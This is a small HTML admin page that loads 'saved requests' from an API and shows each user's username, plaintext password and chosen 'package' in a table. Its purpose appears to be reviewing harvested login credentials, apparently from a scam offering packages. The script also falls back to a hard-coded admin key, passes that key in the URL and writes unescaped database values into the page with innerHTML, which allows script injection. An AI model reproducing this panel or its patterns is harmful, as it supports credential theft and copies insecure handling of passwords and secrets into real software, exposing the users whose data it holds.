<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Saved Requests (Admin)</title>
  <style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0f19; color: #fff; padding: 20px; text-align: center; }
    h1 { color: #ec4899; margin-bottom: 20px; }
    .table-container { max-width: 1000px; margin: 0 auto; background: #111827; border-radius: 12px; padding: 20px; border: 1px solid #1f2937; box-shadow: 0 4px 20px rgba(0,0,0,0.5); overflow-x: auto; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #1f2937; }
    th { color: #9ca3af; font-size: 14px; text-transform: uppercase; }
    td { font-size: 15px; word-break: break-all; }
    .password-text { color: #f43f5e; font-weight: bold; }
    .back-btn { display: inline-block; margin-top: 20px; color: #a855f7; text-decoration: none; font-weight: bold; }
  </style>
</head>
<body>

  <h1>Saved Requests (Database)</h1>

  <div class="table-container">
    <table>
      <thead>
        <tr>
          <th>ID</th>
          <th>USERNAME</th>
          <th>PASSWORD</th>
          <th>PACKAGE</th>
          <th>CREATED AT</th>
        </tr>
      </thead>
      <tbody id="requestsTable">
        <tr><td colspan="5" style="text-align:center;">Loading data...</td></tr>
      </tbody>
    </table>
  </div>

  <a href="/" class="back-btn">← Back to Home</a>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const adminKey = urlParams.get('key') || 'asad123';

    fetch(`/api/requests?key=${adminKey}`)
      .then(res => {
        if (!res.ok) throw new Error("Unauthorized");
        return res.json();
      })
      .then(data => {
        const tbody = document.getElementById('requestsTable');
        tbody.innerHTML = '';

        if (Array.isArray(data) && data.length > 0) {
          data.forEach(req => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
              <td>${req.id}</td>
              <td>${req.username}</td>
              <td class="password-text">${req.password || 'N/A'}</td>
              <td>${req.package}</td>
              <td>${req.created_at}</td>
            `;
            tbody.appendChild(tr);
          });
        } else {
          tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">No requests found.</td></tr>';
        }
      })
      .catch(err => {
        document.getElementById('requestsTable').innerHTML = '<tr><td colspan="5" style="text-align:center; color:#ef4444;">Error: Failed to load data</td></tr>';
      });
  </script>
</body>
</html>
